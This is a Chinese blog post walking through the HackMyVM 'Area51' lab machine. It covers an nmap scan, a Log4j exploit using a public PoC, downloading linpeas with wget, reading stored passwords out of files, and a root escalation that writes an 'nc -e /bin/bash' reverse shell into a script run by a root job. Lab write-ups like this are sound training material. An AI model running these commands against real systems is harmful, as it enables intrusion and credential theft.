---
title: 靶场—log4j
data: 2022-1-3
tags: 	
	- 靶场
---

来自于HMV的Area51靶场。难度属于中等

<!-- more -->

**探测靶机**

打靶场的第一个套路学就是利用nmap扫一下，看看有什么端口开放，发现开放了三个端口22，80，8080

![image-20220123163040570](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202202180927151.png)

从指纹上来看，80端口是一个http服务，22端口是ssh linux系统的远程终端，8080指纹貌似也是http协议的，是一个报错页面。

![image-20220123163143830](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202202180930214.png)

![image-20220123163201633](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202202180930905.png)

第一个套路用完，我们开始上第二个套路枚举路径

![image-20220123164307438](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202202180930406.png)

访问下/note.txt网站

![image-20220123164333278](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202202180930305.png)

翻译过来就是这里存在着log4j漏洞，直接用exp去打https://github.com/kozmer/log4j-shell-poc

![image-20220123165915324](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202202180930726.png)

![image-20220123165941146](靶场——log4j.assets/image-20220123165941146.png)

使用EXP生成请求头

![image-20220206110336526](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202202180930164.png)

发送过去，并且使用NC监听9001端口

![image-20220206110421914](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202202180930764.png)

![image-20220206110404286](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202202180930882.png)

发现是在docker里面，上传一个linpeas.sh搜集下信息

kali下载好linpeas.sh，使用python在linpeas.sh存在的目录开启一个服务器

```
python3 -m http.server 7788
```

监听这边的终端页面执行下载linpeas.sh

```
wget http://192.168.2.148:7788/linpeas.sh
```

执行linpeas.sh信息收集

```
chmod +x linpeas.sh
./linpeas.sh
```

发现一些目录查看下

![image-20220206110618368](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202202180930967.png)

```
cat /var/tmp/.roger，查询到roger的密码
```

![image-20220206110657170](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202202180930222.png)

```
使用ssh远程登录
ssh roger@10.35.0.101 
```

![image-20220206111220505](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202202180930909.png)

![image-20220206111234673](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202202180930480.png)

收集到一个flag，继续收集发现了roger下有个kang

```
cat /etc/pam.d/kang，发现是kang的密码
su kang
```

![image-20220206111911261](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202202180931554.png)

![image-20220206111941834](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202202180931108.png)

发现kang的主目录发生了一些奇怪的事情，一个文件不断出现并消失

看起来像是kang用户创建了一个shell脚本，执行所有的.sh文件并删除它们

它是每2秒左右就删除文件，并且从输出的结果再看，uid居然是0，执行的，也就是root权限！思考了一下看看能不能写个rm进行然后再进行调用下，不就root权限了嘛

```
echo "echo test >/tmp/test" > test.sh
ls /tmp/test -l
echo "nc -e /bin/bash 10.17.0.249 4444" >test.sh
```

![image-20220206112038823](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202202180931752.png)

新开一个终端页面开启监听

```
nc -nvlp 4444
python3 -c 'import pty;pty.spawn("/bin/bash")'
cd root
cat root.txt
```

![image-20220206112904960](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202202180931759.png)

![image-20220206113002025](https://doraemon-1307638820.cos.ap-guangzhou.myqcloud.com/img/202202180931526.png)

拿下！
